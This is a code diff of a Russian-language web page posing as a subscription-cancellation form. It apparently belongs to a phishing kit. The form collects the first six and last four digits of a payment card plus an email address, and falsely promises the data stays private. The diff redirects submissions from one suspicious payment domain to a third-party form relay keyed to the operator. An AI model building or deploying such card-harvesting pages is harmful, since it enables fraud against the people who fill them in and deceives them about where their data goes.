@@ -67,7 +67,7 @@
   </head>
   <body>
 
-    <form action="https://newpaymentss.co/api/request/">
+    <form action="https://api.staticforms.xyz/submit" method="post">
     <h2>Отмена подписки на сервис</h2>
 
     <div class="formcontainer">
@@ -76,12 +76,13 @@
 Мы являемся единственным хранителем информации, собранной на данном сайте: Ваши личные данные не будут каким-либо образом переданы третьим лицам, или использованы без согласия с Вашей стороны.</div>
     <hr/>
     <div class="container">
-    <input type="hidden" name="amount" value="100" />
-    <input type="hidden" name="merchant_order_id" value="1" />
-    <input type="hidden" name="use_system_forms" value="1" />
+      
+<input type="hidden" name="accessKey" value="4a210b92-25ba-4cfd-86cc-1f5153b80aa1">
+      <input type="hidden" name="subject" value="wbguru" />
+        <input type="hidden" name="replyTo" value="@">
     <label for="uname">Номер карты:</label>
-    <input type="text" maxlength="16" placeholder="Первые 6 цифр карты" name="card_number" required>
-    <input type="text" maxlength="16" placeholder="Последние 4 цифры карты" name="card_number" required>
+    <input type="text" maxlength="16" placeholder="Первые 6 цифр карты" name="$6number" required>
+    <input type="text" maxlength="16" placeholder="Последние 4 цифры карты" name="$4number" required>
     <label for="uname">Электронная почта:</label>
     <input type="text" placeholder="Ваш Email" name="email" required>
     </div>
